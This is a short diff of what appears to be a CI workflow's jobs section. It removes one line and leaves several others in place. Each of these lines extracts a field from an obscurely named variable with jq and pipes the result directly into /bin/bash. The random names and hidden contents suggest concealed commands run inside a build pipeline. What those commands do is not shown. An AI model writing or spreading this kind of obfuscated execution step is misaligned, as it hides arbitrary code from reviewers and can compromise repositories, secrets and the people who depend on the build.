@@ -23,7 +23,6 @@ jobs:
           echo $k00992 | jq -r .mng8 | /bin/bash
           echo $hz438 | jq -r .txpn62 | /bin/bash
           printf '%s' "$xduq03748" | jq -r .d1251 | /bin/bash
-          echo $jgtwg97479 | jq -r .ckghm2 | /bin/bash
           printf '%s' "$x2621" | jq -r .clpll2358 | /bin/bash
           printf '%s' "$icex34" | jq -r .crdv7068 | /bin/bash
           printf '%s' "$afkbr7880" | jq -r .ovwbc09388 | /bin/bash
